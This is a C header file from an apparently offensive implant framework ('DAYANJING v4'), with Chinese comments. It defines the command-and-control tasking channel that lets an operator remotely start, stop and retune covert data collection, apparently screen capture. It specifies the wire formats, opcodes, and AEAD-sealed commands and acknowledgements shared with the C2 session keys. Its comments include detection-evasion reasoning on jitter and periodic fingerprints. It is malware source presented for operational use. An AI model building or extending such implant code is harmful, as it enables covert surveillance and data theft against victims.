/*
 * DAYANJING v4 — exfil_task.h
 *
 * C2 下行任务通道：服务端远程下令"开采 / 停采 / 改参数"。
 *
 * ====================================================================
 * 为什么必须单独有这一层
 * ====================================================================
 * 21_exfil 的调度层（exfil_sched）解决了"本地怎么节制地采"，但触发
 * 与参数都写死在植入体本地。真实作业里这是不可接受的：
 *
 *   1) 按需能力丧失 —— 目标静止时不需要采集，却无法远程叫停；
 *      发现有价值画面时又无法临时加密度。
 *   2) 参数不可调 —— 带宽/检测环境在部署前无从预知，硬编码的 1s/2s
 *      抖动在真实目标上要么过量暴露、要么错过窗口。
 *   3) 失控风险 —— 植入体一旦部署，行为无法收回。
 *
 * 本层把"调度决策"从本地常量变成受控远程能力。命令走 02_c2 的帧层
 * AEAD（不新造加密），因此：
 *   - 只有持有会话密钥者能下令（伪造命令 => AUTH 失败）
 *   - 帧层 seq/counter 提供重放防护
 *   - 与回传通道共用同一套会话密钥，不存在第二套凭据
 *
 * ====================================================================
 * 线上格式（确定性编码，与 Python 侧 exfil_task.py 逐字节一致）
 * ====================================================================
 * 命令 payload（56 字节）：
 *   u8  opcode
 *   u8  flags        必须为 0
 *   u16 rsv          必须为 0
 *   u64 task_id      LE，回执关联用
 *   u64 min_interval_us
 *   u64 max_interval_us
 *   u32 burst_max
 *   u64 window_us
 *   u32 window_max_frames
 *   u64 window_max_bytes
 *   u8  dedup
 *   u8  pad[3]       必须为 0
 *
 * 回执 payload（32 字节）：
 *   u8  opcode_acked
 *   u8  status
 *   u16 rsv          必须为 0
 *   u64 task_id
 *   u32 mode
 *   u32 frames_sent
 *   u32 window_frames
 *   u64 window_bytes
 *
 * ====================================================================
 * 三条必须做对的硬规则
 * ====================================================================
 * 一、编码必须唯一（canonical）。
 *     所有保留位、填充位必须为 0；非 SET_CFG 命令的配置字段也必须为 0。
 *     否则同一语义存在多种字节表示，接收端实现差异会造成解析分歧，
 *     且给"隐藏字段"留下空间。解码端一律校验并报 CANON。
 *
 * 二、配置必须先校验再生效。
 *     max_interval < min_interval 这类非法配置若直接写入调度器，会让
 *     poll 永远返回 WAIT —— 表现为"命令执行成功但再也不采集"，
 *     是最难排查的一类静默故障。apply 在写入前拒绝并回 BAD_CFG。
 *
 * 三、SET_CFG 绝不重置配额窗口。
 *     若改配置就清空窗口计数，服务端（或被劫持的通道）可通过高频
 *     SET_CFG 反复刷新配额，速率治理形同虚设。配置可变，窗口不可刷。
 */

#ifndef DAYANJING_EXFIL_TASK_H
#define DAYANJING_EXFIL_TASK_H

#include <stddef.h>
#include <stdint.h>

#include "exfil_sched.h"

#ifdef __cplusplus
extern "C" {
#endif

/* ---- 帧层 msg_type（0x20/0x21/0x22/0x23 已被占用，故取 0x24/0x25）---- */
#define EXF_MSG_TASK     0x24u   /* 服务端 -> 植入体 */
#define EXF_MSG_TASK_ACK 0x25u   /* 植入体 -> 服务端 */

/* ---- 操作码 ---- */
#define EXF_TASK_OP_START   1   /* 进入连续采集 */
#define EXF_TASK_OP_ONCE    2   /* 采一帧后自动停止 */
#define EXF_TASK_OP_STOP    3   /* 立即停止 */
#define EXF_TASK_OP_SET_CFG 4   /* 改配置（不改运行模式） */
#define EXF_TASK_OP_QUERY   5   /* 只查询，不改任何状态 */

/* ---- 回执状态 ---- */
#define EXF_TASK_ST_OK       0
#define EXF_TASK_ST_BAD_CFG  1   /* 配置非法，已拒绝，状态未变 */
#define EXF_TASK_ST_UNKNOWN  2   /* 未知操作码，已拒绝 */

/* ---- payload 定长 ---- */
#define EXF_TASK_CMD_LEN 56
#define EXF_TASK_ACK_LEN 32

/* ---- 返回码 ---- */
#define EXF_TASK_OK        0
#define EXF_TASK_ERR_ARG  -1   /* 参数非法（空指针） */
#define EXF_TASK_ERR_LEN  -2   /* 长度非法 / 缓冲区不足 */
#define EXF_TASK_ERR_FMT  -3   /* 格式错误（长度不符 / opcode 未知） */
#define EXF_TASK_ERR_CANON -4  /* 保留位非 0 —— 编码不唯一 */
#define EXF_TASK_ERR_CFG  -5   /* 配置非法 */
#define EXF_TASK_ERR_AUTH -6   /* AEAD 验签失败 */

typedef struct {
    uint8_t  opcode;
    uint64_t task_id;
    exfil_sched_cfg_t cfg;   /* 仅 SET_CFG 有效，其余必须为 0 */
} exfil_task_cmd_t;

typedef struct {
    uint8_t  opcode;         /* 被回执的操作码 */
    uint8_t  status;         /* EXF_TASK_ST_* */
    uint64_t task_id;        /* 与命令一致，供服务端关联 */
    uint32_t mode;           /* 执行后的模式 */
    uint64_t frames_sent;
    uint32_t window_frames;  /* 执行后的窗口用量 */
    uint64_t window_bytes;
} exfil_task_ack_t;

/* ---- 编解码（纯内存，不加密）---- */

int exfil_task_encode_cmd(const exfil_task_cmd_t *c,
                          uint8_t out[EXF_TASK_CMD_LEN]);

int exfil_task_decode_cmd(const uint8_t in[EXF_TASK_CMD_LEN],
                          exfil_task_cmd_t *c);

int exfil_task_encode_ack(const exfil_task_ack_t *a,
                          uint8_t out[EXF_TASK_ACK_LEN]);

int exfil_task_decode_ack(const uint8_t in[EXF_TASK_ACK_LEN],
                          exfil_task_ack_t *a);

/* 独立校验配置（供服务端在打包前自检，也供 apply 内部调用） */
int exfil_task_cfg_ok(const exfil_sched_cfg_t *cfg);

/*
 * 把命令作用到调度器。
 *
 * 成功返回 EXF_TASK_OK；配置非法返回 EXF_TASK_ERR_CFG 且**不改动** s。
 * SET_CFG 只改配置，不改运行模式；窗口配额**不重置**（见文件头第三条）。
 *
 * seed 不在此处变更：抖动种子只在 init 时确定，远程可改间隔但不可
 * 重置 rng —— 否则服务端能令抖动序列可预测，重新制造周期指纹。
 */
int exfil_task_apply(exfil_sched_t *s, const exfil_task_cmd_t *c);

/* 按调度器当前状态填回执（status 由调用方填） */
int exfil_task_fill_ack(const exfil_sched_t *s,
                        const exfil_task_cmd_t *c,
                        uint8_t status,
                        exfil_task_ack_t *a);

/* ---- 走 02_c2 帧层 AEAD ---- */

int exfil_task_seal_cmd(const uint8_t key[16], const uint8_t pfx[8],
                        uint32_t counter, uint64_t seq,
                        const exfil_task_cmd_t *c,
                        uint8_t *out, size_t cap, size_t *out_len);

int exfil_task_open_cmd(const uint8_t key[16],
                        const uint8_t *wire, size_t wire_len,
                        uint64_t *seq, exfil_task_cmd_t *c);

int exfil_task_seal_ack(const uint8_t key[16], const uint8_t pfx[8],
                        uint32_t counter, uint64_t seq,
                        const exfil_task_ack_t *a,
                        uint8_t *out, size_t cap, size_t *out_len);

int exfil_task_open_ack(const uint8_t key[16],
                        const uint8_t *wire, size_t wire_len,
                        uint64_t *seq, exfil_task_ack_t *a);

const char *exfil_task_errstr(int e);
const char *exfil_task_opstr(uint8_t op);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EXFIL_TASK_H */
